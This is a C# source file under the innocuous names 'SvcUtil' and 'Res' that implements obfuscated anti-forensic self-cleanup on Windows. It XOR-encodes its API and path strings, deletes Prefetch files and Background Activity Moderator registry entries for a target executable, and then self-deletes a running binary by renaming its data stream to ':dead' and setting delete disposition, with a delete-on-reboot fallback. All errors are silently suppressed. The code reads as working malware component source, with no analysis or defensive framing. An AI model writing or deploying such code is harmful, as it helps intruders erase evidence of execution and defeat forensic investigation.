using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    internal static class Res
    {
        private static readonly byte[] _xk = { 0xAF, 0x3C, 0x71, 0xE2, 0x59 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // ── Encoded API strings ────────────────────────────────────

        // "kernel32.dll"
        private static readonly byte[] _k32 =
            { 0xC4, 0x59, 0x03, 0x8C, 0x3C, 0xC3, 0x0F, 0x43,
              0xCC, 0x3D, 0xC3, 0x50 };

        // "CreateFileW"
        private static readonly byte[] _s01 =
            { 0xEC, 0x4E, 0x14, 0x83, 0x2D, 0xCA, 0x7A, 0x18,
              0x8E, 0x3C, 0xF8 };

        // "SetFileInformationByHandle"
        private static readonly byte[] _s02 =
            { 0xFC, 0x59, 0x05, 0xA4, 0x30, 0xC3, 0x59, 0x38,
              0x8C, 0x3F, 0xC0, 0x4E, 0x1C, 0x83, 0x2D, 0xC6,
              0x53, 0x1F, 0xA0, 0x20, 0xE7, 0x5D, 0x1F, 0x86,
              0x35, 0xCA };

        // "CloseHandle"
        private static readonly byte[] _s03 =
            { 0xEC, 0x50, 0x1E, 0x91, 0x3C, 0xE7, 0x5D, 0x1F,
              0x86, 0x35, 0xCA };

        // "DeleteFileW"
        private static readonly byte[] _s04 =
            { 0xEB, 0x59, 0x1D, 0x87, 0x2D, 0xCA, 0x7A, 0x18,
              0x8E, 0x3C, 0xF8 };

        // "MoveFileExW"
        private static readonly byte[] _s05 =
            { 0xE2, 0x53, 0x07, 0x87, 0x1F, 0xC6, 0x50, 0x14,
              0xA7, 0x21, 0xF8 };

        // "advapi32.dll"
        private static readonly byte[] _adv =
            { 0xCE, 0x58, 0x07, 0x83, 0x29, 0xC6, 0x0F, 0x43,
              0xCC, 0x3D, 0xC3, 0x50 };

        // "RegOpenKeyExW"
        private static readonly byte[] _s06 =
            { 0xFD, 0x59, 0x16, 0xAD, 0x29, 0xCA, 0x52, 0x3A,
              0x87, 0x20, 0xEA, 0x44, 0x26 };

        // "RegDeleteValueW"
        private static readonly byte[] _s07 =
            { 0xFD, 0x59, 0x16, 0xA6, 0x3C, 0xC3, 0x59, 0x05,
              0x87, 0x0F, 0xCE, 0x50, 0x04, 0x87, 0x0E };

        // "RegEnumValueW"
        private static readonly byte[] _s08 =
            { 0xFD, 0x59, 0x16, 0xA7, 0x37, 0xDA, 0x51, 0x27,
              0x83, 0x35, 0xDA, 0x59, 0x26 };

        // "RegCloseKey"
        private static readonly byte[] _s09 =
            { 0xFD, 0x59, 0x16, 0xA1, 0x35, 0xC0, 0x4F, 0x14,
              0xA9, 0x3C, 0xD6 };

        // ── Encoded path/name strings ──────────────────────────────

        // "Prefetch"
        private static readonly byte[] _n1 =
            { 0xFF, 0x4E, 0x14, 0x84, 0x3C, 0xDB, 0x5F, 0x19 };

        // ":dead"
        private static readonly byte[] _n2 =
            { 0x95, 0x58, 0x14, 0x83, 0x3D };

        // "SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\"
        private static readonly byte[] _n3 =
            { 0xFC, 0x65, 0x22, 0xB6, 0x1C, 0xE2, 0x60, 0x32,
              0x97, 0x2B, 0xDD, 0x59, 0x1F, 0x96, 0x1A, 0xC0,
              0x52, 0x05, 0x90, 0x36, 0xC3, 0x6F, 0x14, 0x96,
              0x05, 0xFC, 0x59, 0x03, 0x94, 0x30, 0xCC, 0x59,
              0x02, 0xBE, 0x3B, 0xCE, 0x51, 0x2D, 0xB1, 0x2D,
              0xCE, 0x48, 0x14, 0xBE, 0x0C, 0xDC, 0x59, 0x03,
              0xB1, 0x3C, 0xDB, 0x48, 0x18, 0x8C, 0x3E, 0xDC,
              0x60 };

        // ── Constants ──────────────────────────────────────────────
        private const uint _c0 = 0x00010000;
        private const uint _c1 = 0x00000001;
        private const uint _c2 = 3;
        private const uint _c3 = 0x80;
        private static readonly IntPtr _iv = new IntPtr(-1);
        private const int _c4 = 3;
        private const int _c5 = 4;
        private const uint _c6 = 0x00000004;
        private static readonly UIntPtr _hklm = new UIntPtr(0x80000002u);
        private const uint _c7 = 0x0001;
        private const uint _c8 = 0x0002;
        private const int _c9 = 0;
        private const int _ca = 259;

        // ── Delegate types ─────────────────────────────────────────
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate IntPtr D01(string a, uint b, uint c, IntPtr d, uint e, uint f, IntPtr g);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool D02(IntPtr a, int b, IntPtr c, uint d);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool D03(IntPtr a);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate bool D04(string a);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate bool D05(string a, string b, uint c);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate int D06(UIntPtr a, string b, uint c, uint d, out IntPtr e);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate int D07(IntPtr a, string b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate int D08(IntPtr a, uint b, StringBuilder c, ref uint d, IntPtr e, IntPtr f, IntPtr g, IntPtr h);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int D09(IntPtr a);

        // ── Cached delegates ───────────────────────────────────────
        private static D01 _d01;
        private static D02 _d02;
        private static D03 _d03;
        private static D04 _d04;
        private static D05 _d05;
        private static D06 _d06;
        private static D07 _d07;
        private static D08 _d08;
        private static D09 _d09;

        private static T RV<T>(byte[] dl, byte[] fn) where T : class
        {
            IntPtr h = W.M0(D(dl));
            if (h == IntPtr.Zero) return null;
            IntPtr p = W.M1(h, D(fn));
            if (p == IntPtr.Zero) return null;
            return (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));
        }

        // ── Public API ─────────────────────────────────────────────

        public static void Run(string sp, bool elev)
        {
            bool im = string.IsNullOrEmpty(sp) || !File.Exists(sp);

            if (!im && elev)
                C1(sp);

            if (elev)
                C2(sp);

            if (!im)
                C3(sp);
        }

        public static void RL(string sp)
        {
            if (!string.IsNullOrEmpty(sp) && File.Exists(sp))
                C3(sp);
        }

        // ── C1 ─────────────────────────────────────────────────────

        private static void C1(string sp)
        {
            try
            {
                string pd = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    D(_n1));

                if (!Directory.Exists(pd))
                    return;

                string bn = Path.GetFileNameWithoutExtension(sp).ToUpper();

                if (_d04 == null)
                    _d04 = RV<D04>(_k32, _s04);
                if (_d04 == null) return;

                foreach (string pf in Directory.GetFiles(pd, "*.pf"))
                {
                    string fn = Path.GetFileName(pf).ToUpper();
                    if (fn.StartsWith(bn))
                        _d04(pf);
                }
            }
            catch { }
        }

        // ── C2 ─────────────────────────────────────────────────────

        private static void C2(string sp)
        {
            try
            {
                if (_d06 == null)
                    _d06 = RV<D06>(_adv, _s06);
                if (_d07 == null)
                    _d07 = RV<D07>(_adv, _s07);
                if (_d08 == null)
                    _d08 = RV<D08>(_adv, _s08);
                if (_d09 == null)
                    _d09 = RV<D09>(_adv, _s09);

                if (_d06 == null || _d07 == null ||
                    _d08 == null || _d09 == null)
                    return;

                string sid = System.Security.Principal.WindowsIdentity
                    .GetCurrent().User.Value;

                string bp = D(_n3) + sid;

                IntPtr hk;
                int r = _d06(_hklm, bp, 0, _c7 | _c8, out hk);

                if (r != _c9)
                    return;

                string mn = null;
                if (!string.IsNullOrEmpty(sp))
                    mn = Path.GetFileName(sp).ToLower();

                uint idx = 0;
                var td = new System.Collections.Generic.List<string>();

                while (true)
                {
                    uint nl = 1024;
                    StringBuilder vn = new StringBuilder((int)nl);

                    r = _d08(hk, idx, vn, ref nl,
                        IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                    if (r == _ca)
                        break;

                    if (r == _c9 && mn != null)
                    {
                        string n = vn.ToString().ToLower();
                        if (n.Contains(mn))
                            td.Add(vn.ToString());
                    }
                    idx++;
                }

                foreach (string v in td)
                    _d07(hk, v);

                _d09(hk);
            }
            catch { }
        }

        // ── C3 ─────────────────────────────────────────────────────

        private static void C3(string sp)
        {
            try
            {
                if (string.IsNullOrEmpty(sp) || !File.Exists(sp))
                    return;

                if (_d01 == null)
                    _d01 = RV<D01>(_k32, _s01);
                if (_d02 == null)
                    _d02 = RV<D02>(_k32, _s02);
                if (_d03 == null)
                    _d03 = RV<D03>(_k32, _s03);

                if (_d01 == null || _d02 == null || _d03 == null)
                    return;

                IntPtr hf = _d01(sp, _c0, _c1, IntPtr.Zero, _c2, _c3, IntPtr.Zero);

                if (hf == _iv)
                {
                    C4(sp);
                    return;
                }

                string ns = D(_n2);
                byte[] nb = Encoding.Unicode.GetBytes(ns);

                int hs = IntPtr.Size == 8 ? 20 : 12;
                int ts = hs + nb.Length;
                IntPtr buf = Marshal.AllocHGlobal(ts);

                try
                {
                    for (int i = 0; i < ts; i++)
                        Marshal.WriteByte(buf, i, 0);

                    Marshal.WriteInt32(buf, 0, 0);
                    Marshal.WriteIntPtr(buf, IntPtr.Size == 8 ? 8 : 4, IntPtr.Zero);
                    Marshal.WriteInt32(buf, IntPtr.Size == 8 ? 16 : 8, nb.Length);
                    Marshal.Copy(nb, 0, IntPtr.Add(buf, hs), nb.Length);

                    if (!_d02(hf, _c4, buf, (uint)ts))
                    {
                        _d03(hf);
                        C4(sp);
                        return;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buf);
                }

                _d03(hf);

                hf = _d01(sp, _c0, _c1, IntPtr.Zero, _c2, _c3, IntPtr.Zero);

                if (hf != _iv)
                {
                    IntPtr db = Marshal.AllocHGlobal(4);
                    try
                    {
                        Marshal.WriteInt32(db, 1);
                        _d02(hf, _c5, db, 4);
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(db);
                    }
                    _d03(hf);
                }
            }
            catch
            {
                C4(sp);
            }
        }

        private static void C4(string sp)
        {
            try
            {
                if (_d05 == null)
                    _d05 = RV<D05>(_k32, _s05);
                if (_d05 != null)
                    _d05(sp, null, _c6);
            }
            catch { }
        }
    }
}
